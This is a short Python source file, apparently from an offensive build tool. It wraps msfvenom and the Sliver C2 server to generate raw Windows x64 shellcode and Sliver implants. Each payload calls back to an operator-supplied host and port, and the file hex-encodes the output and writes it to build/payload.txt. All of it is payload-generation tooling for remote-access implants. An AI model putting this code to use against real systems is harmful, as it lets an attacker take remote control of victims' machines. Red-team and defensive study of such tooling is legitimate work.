import subprocess

# Function to generate a payload using msfvenom and save bytes of the payload in a file
def msfvenom(payload, rhost, rport, ruri, cmd, verbose):
    RURI_part = f" LURI={ruri}" if ruri else ""
    CMD_part = f" CMD={cmd}" if cmd else ""
    if ruri and cmd:
        raise ValueError("Cannot specify both RURI and CMD")
    command = f"msfvenom -p {payload} LHOST={rhost} LPORT={rport} {RURI_part} {CMD_part} -a x64 --platform windows -f raw 2>/dev/null | xxd -p | tr -d '\\n' > build/payload.txt"
    print(f"Generating payload :\n{command}") if verbose else None
    subprocess.run(command, shell=True, check=True)

def sliver(payload, lhost, lport, uri, cmd, verbose):
    URI_part = f" --http-uri {uri}" if uri else ""
    CMD_part = f" CMD={cmd}" if cmd else ""
    command = f"sliver-server generate --mtls --lhost {lhost} --lport {lport} {URI_part} --format raw | xxd -p | tr -d '\\n' > build/payload.txt"
    print(f"Generating payload :\n{command}") if verbose else None
    subprocess.run(command, shell=True, check=True)